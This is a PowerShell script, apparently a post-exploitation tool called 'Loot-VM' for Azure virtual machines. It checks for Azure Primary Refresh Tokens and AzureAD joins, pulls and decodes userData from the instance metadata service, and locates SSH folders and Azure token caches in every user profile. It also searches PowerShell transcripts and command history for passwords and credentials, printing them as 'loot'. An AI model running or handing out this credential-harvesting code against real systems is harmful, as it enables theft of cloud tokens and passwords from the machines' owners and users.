Function Loot-VM {
    $output = dsregcmd /status
    Write-Host ""
    Write-Host "--------------[PRT Check]--------------"
    if ($output -match "AzureAdPrt\s+:\s+YES") {
        Write-Host -ForegroundColor Red "[+] Machine contains an Azure PRT!"
    }
    else { Write-Host -ForegroundColor Green "[+] Machine does not contain an Azure PRT." }

    $output = dsregcmd /status
    Write-Host ""
    Write-Host "--------------[AzureAD Join Check]--------------"
    if ($output -match "AzureAdJoined\s+:\s+YES") {
        Write-Host -ForegroundColor Red "[+] Machine is joined to AzureAD!"
    }
    else { Write-Host -ForegroundColor Green "[+] Machine is not joined to AzureAD." }
    
    Write-Host ""
    Write-Host "--------------[User Data Check]--------------"
    $userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" -ErrorAction SilentlyContinue
    if ($userData) {
        Write-Host -ForegroundColor Green "[+] Found User Data!"
        $decrypted = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
        Write-Host -ForegroundColor Red " $decrypted "
    }
    Write-Host ""
    Write-Host "--------------[.ssh/.Azure Check]--------------"
    Get-ChildItem -Path "C:\Users" -Directory | ForEach-Object {
        $userPath = $_.FullName
        $userPath_Azure = Join-Path $userPath ".Azure"

        # Check for .ssh folder
        If (Test-Path (Join-Path $userPath ".ssh")) {
            Write-Host -ForegroundColor Green "[+] .ssh folder found in $userPath"
        }

        # Check for accessTokens.json file
        If (Test-Path (Join-Path $userPath_Azure "accessTokens.json")) {
            Write-Host -ForegroundColor DarkRed "[+] accessTokens.json found in $userPath_Azure"
        }
        # Check for TokenCache.dat file
        If (Test-Path (Join-Path $userPath_Azure "TokenCache.dat")) {
            Write-Host -ForegroundColor DarkRed "[+] TokenCache.dat found in $userPath_Azure"
        }
    }
    Write-Host ""
    Write-Host "--------------[PS Transcript Check]--------------"
    Get-ChildItem -Path "C:\Users" -Directory | ForEach-Object {
        $userPath = $_.FullName
        $userPath_Azure = Join-Path $userPath ".Azure"
        $userPath_Documents = Join-Path $userPath "Documents"

        If (Test-Path $userPath_Documents) {
            Get-ChildItem -Path $userPath_Documents -Filter "*PowerShell_transcript*.txt" -File | ForEach-Object {
                Write-Host -ForegroundColor Green "[+] Transcript file found: $($_.FullName)"
                #$tr = $($_.FullName)
                if (Get-Content $($_.FullName) | Select-String -Pattern "pass|pwd|secure|cred|Save-AzContext" | Where {$_ -NotMatch "Get-AzAD|Get-AzureAD"}) {
                    Write-Host -ForegroundColor Red "[+] Possible loot:"
                    Get-Content $($_.FullName) | Select-String -Pattern "pass|pwd|secure|cred|Save-AzContext" | Where {$_ -NotMatch "Get-AzAD|Get-AzureAD"}
                }
            }
        }
    }
    Write-Host ""
    Write-Host "--------------[PS ConsoleHistory Check]--------------"
    Get-ChildItem -Path "C:\Users" -Directory | ForEach-Object {
	    $userPath = $_.FullName
        $userPath_historyFilePath = Join-Path -Path $userPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

        If (Test-Path $userPath_historyFilePath) {
            Write-Host -ForegroundColor Green "[+] History file found for: $($_.Name)"
            Write-Host "[+] Path: $userPath_historyFilePath"
            if (Get-Content $userPath_historyFilePath | Select-String -Pattern "pass|pwd|secure|cred|Save-AzContext" | Where {$_ -NotMatch "Get-AzAD|Get-AzureAD"}) {
                Write-Host -ForegroundColor Green "[+] Possible loot:"
                Write-Host -ForegroundColor Red "__________[/Start of $($_.Name)'s data]__________"
                Get-Content $userPath_historyFilePath | Select-String -Pattern "pass|pwd|secure|cred|Save-AzContext" | Where {$_ -NotMatch "Get-AzAD|Get-AzureAD"}
                Write-Host "" 
                Write-Host -ForegroundColor Red "__________[/End of $($_.Name)'s data]__________"
	            Write-Host ""
            }
        }
    }
}